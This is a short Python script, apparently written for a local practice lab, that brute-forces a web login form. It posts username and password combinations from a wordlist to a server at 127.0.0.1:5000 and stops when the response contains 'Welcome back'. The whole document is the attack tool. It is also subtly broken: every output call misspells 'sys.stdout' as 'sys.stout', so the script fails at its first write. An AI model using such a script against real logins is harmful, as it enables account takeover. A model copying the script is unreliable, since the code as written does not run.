import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "admin123", "user"]
passwords = "top-100.txt"
needle = "Welcome back"   # content of success message

for username in usernames:
	with open(passwords ,"r") as password_list:
		for password in password_list:
			password = password.strip("\n").encode()
			sys.stout.write(f"[X] Attempting username:password {username}:{password.decode()}")
			sys.stout.flush()
			r = requests.post(target, data={"username":username, "password":password})
			if needle.encode() in r.content:
				sys.stout.write("\n")
				sys.stout.write(f"\t[>>>] Valid password '{password.decode()}' for user '{username}'")
				sys.exit()
		sys.stout.flush()
		sys.stout.write("\n")
		sys.stout.write(f"\tNo password found for '{username}'")
